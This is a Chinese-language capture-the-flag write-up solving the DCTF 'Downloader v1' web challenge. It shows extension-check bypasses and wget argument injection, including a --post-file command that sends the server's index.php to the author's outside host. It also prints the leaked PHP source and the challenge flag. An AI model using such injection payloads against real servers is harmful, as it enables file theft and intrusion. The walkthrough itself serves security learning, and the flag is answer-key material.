# Downloader v1

這題給你輸入一個網址，他會用wget去抓這個網址的檔案下來放進`/uploads/<random>/`

它會對一些常見特殊字元做轉義，所以沒辦法直接Command Injection

接著它會再下一行指令: `bash -c 'rm $target/*.{php,pht,phtml,php4,php5,php6,php7}'`，避免你傳php上去

不過其實還是有很多方法可以上傳php的

例如`rm *.php`其實不會刪除到`.xxx.php`這種類型的檔名

然後要繞掉他的副檔名輸入檢查可以簡單在最後加個空格就行: `http://kaibro.tw/.a.php `

這樣就會成功傳一個php上去，只是他該目錄設定成不解析php，所以沒辦法跑php

沒關係，換個招

這邊其實可以用argument injection之類的方法

例如: `wget http://kaibro.tw -O ../abc`

就能控制寫檔的位置和檔名

甚至還能做到上傳檔案:

`wget http://kaibro.tw --post-file=/var/www/html/index.php kaibro.tw:8787`

然後就能讀到source code惹:

```php
<?php

ini_set('display_errors', 0);
$out   = false;
$url   = $_POST['url'] ?? false;
$error = false;

if ($url && !preg_match('#^https?://([a-z0-9-]+\.)*[a-z0-9-]+\.[a-z0-9-]+/.+#i', $url)) {
    $error = 'Invalid URL';
} else if ($url && preg_match('/\.(htaccess|ph(p\d?|t|tml))$/', $url)) { // .htaccess .php .php3 -  .php7 .phtml .pht
    $error = 'Sneaky you!';
}

if (!$error && $url) {
    $target = 'uploads/' .uniqid() . bin2hex(openssl_random_pseudo_bytes(8));
    mkdir($target);
    chdir($target);
    touch('.htaccess');

    $cmd = escapeshellcmd('wget ' . $url) . ' 2>&1';
    $out = "\$ cd $target" . PHP_EOL;
    $out .= '$ ' . $cmd . PHP_EOL;
    $out .= shell_exec($cmd);

    $cmd = "bash -c 'rm $target/*.{php,pht,phtml,php4,php5,php6,php7}'";
    $out .= '$ ' . $cmd . PHP_EOL;
    $out .= shell_exec($cmd) . PHP_EOL;
}

?><!DOCTYPE html>
<html>
<head>
    <title>Downloader v1</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>
<body>

<div class="container mt-5">
    <div class="row">
        <div class="col-8 offset-2">
            <h3 class="text-center">File downloader v1</h3>
            <div class="card mt-5">
                <div class="card-header">Specify an URL to download</div>
                <form class="card-body" method="POST">
                    <?php if ($error): ?>
                    <div class="alert alert-danger" role="alert"><?php echo htmlentities($error); ?></div>
                    <?php endif;?>
                    <div class="form-group">
                        <label>URL to download:</label>
                        <input type="text" name="url" placeholder="http://example.com/image.jpg" value="<?php echo htmlentities($url, ENT_QUOTES); ?>" class="form-control" >
                    </div>
                    <button type="submit" class="btn btn-primary float-right">Submit</button>
                </form>
                <?php if ($out): ?>
                <div class="card-header card-footer">Output:</div>
                <div class="card-body">
                    <pre><code><?php echo htmlentities($out); ?></code></pre>
                </div>
                <?php endif;?>
            </div>
        </div>
    </div>
</div>

<!-- <a href="flag.php">###</a> -->
```

繼續讀`flag.php`:

```php
GET ME!
<?php /* DCTF{f8ebc33b836f0ac262fef4c18d3b18ed405da41bb4389c0d0fa1a5a997da1af0} */ ?>
```
